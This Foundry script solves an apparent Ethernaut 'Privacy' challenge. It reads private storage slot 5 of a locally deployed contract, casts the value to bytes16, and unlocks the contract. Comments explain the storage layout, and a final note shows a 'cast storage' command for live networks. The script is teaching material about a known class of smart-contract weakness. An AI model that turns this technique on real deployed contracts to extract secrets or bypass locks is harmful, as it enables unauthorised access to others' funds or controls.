// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "forge-std/console2.sol";
import {Privacy} from "../src/Privacy.sol";

contract PrivacySolution is Script {
    // $ forge script script/Privacy.s.sol --tc PrivacySolution

    function run() external {
        bytes32[3] memory privateData = _createData("password", "hash", "string");
        Privacy privacyInstance = new Privacy(privateData);

        // --- Attack Starts from Here ---
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);

        // - In the `Privacy` contract, to unlock the contract we need to know the value of the third element in the data element, then we need to get the first 16 bytes of it.
        // - The variables are private, but since the Ethereum blockchain is public we can see everything.
        // - Each slot in the EVM storage occupies 32 bytes, so let us know where are our variables.
        // - In the case of fixed size array elements are placed in the slot in sequence.
        // -
        //      - slot0: `locked` variable
        //      - slot1: ID
        //      - slot2: `flattening` && `denomination` && `awkwardness` variables. remember if variables' sizes are less than 32 bytes they get packed together in one slot.
        //      - slot3: data[0]
        //      - slot4: data[1]
        //      - slot5: data[2]
        //
        // - So we can simply read the 5th slot in the storage, then cast it into bytes16() and we will get the right key that will unlock the Privacy contract, and pass the challenge.

        bytes32 slot5Value = vm.load(address(privacyInstance), bytes32(uint256(5))); // Reading the 5th slot in the `Privacy` contract
        bytes16 key = bytes16(slot5Value); // casting it into `bytes16`
        console.log("key:");
        console.logBytes16(key);
        console.log("-------------");
        console.log("Privacy lock:", privacyInstance.locked());
        console.log("fire unlock(key) ...");
        privacyInstance.unlock(key);
        console.log("Privacy lock:", privacyInstance.locked());

        vm.stopPrank();
        // NOTE:
        // --------------------
        // In case you are deailing with contracts that are deployed in real networks, you can use `cast` instead.
        // Here is an example of how to read storage from contracts deployed on real networks
        // $ cast storage <YOUR_VAULT_INSTANCE_ADDRESS> <SLOT_NUMBER> --rpc-url <YOUR_RPC_URL>
    }

    function _createData(string memory str1, string memory str2, string memory str3)
        internal
        pure
        returns (bytes32[3] memory)
    {
        bytes32 hashing1 = keccak256(bytes(str1));
        bytes32 hashing2 = keccak256(bytes(str2));
        bytes32 hashing3 = keccak256(bytes(str3));

        return [hashing1, hashing2, hashing3];
    }
}
